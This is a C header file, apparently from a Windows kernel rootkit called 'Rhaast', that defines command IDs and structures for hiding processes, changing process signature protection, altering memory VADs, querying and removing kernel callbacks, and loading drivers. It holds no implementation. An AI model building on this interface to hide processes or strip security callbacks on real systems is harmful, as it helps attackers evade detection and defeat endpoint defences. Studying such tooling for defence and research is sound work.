#ifndef RHAAST_COMMANDS_H
#define RHAAST_COMMANDS_H

#include <Types.h>

/* command id's */
#define RHAAST_COMMAND_PROCESS_HIDE     0x501
#define RHAAST_COMMAND_PROCESS_UNHIDE   0x502
#define RHAAST_COMMAND_MEMORY_VAD       0x503
#define RHAAST_COMMAND_PROCESS_PROTECT  0x504
#define RHAAST_COMMAND_CALLBACK_QUERY   0x505
#define RHAAST_COMMAND_CALLBACK_REMOVE  0x506
#define RHAAST_COMMAND_DRIVER_LOAD      0x507

/* command data objects */
typedef struct _RS_C_MEMORY_VAD {
    ULONG     Pid;
    ULONG_PTR Address;
} RS_C_MEMORY_VAD, *PRS_C_MEMORY_VAD;

typedef struct _RS_C_PROCESS_PROTECTION
{
    ULONG             Pid;
    PS_SIG_PROTECTION SignatureProtection;
} RS_C_PROCESS_PROTECTION, *PRS_C_PROCESS_PROTECTION;

typedef struct _RS_C_CALLBACK_QUERY
{
    ULONG Type;
    ULONG Size;
} RS_C_CALLBACK_QUERY, *PRS_C_CALLBACK_QUERY;

typedef struct _RS_C_CALLBACK_REMOVE
{
    ULONG     Type;
    ULONG_PTR Callback;
} RS_C_CALLBACK_REMOVE, * PRS_C_CALLBACK_REMOVE;

typedef struct _RS_C_DRIVER_LOAD
{
    WCHAR     DriverPath[ MAX_PATH ];
    ULONG_PTR DriverBase;
    NTSTATUS  Status;
} RS_C_DRIVER_LOAD, *PRS_C_DRIVER_LOAD;

#endif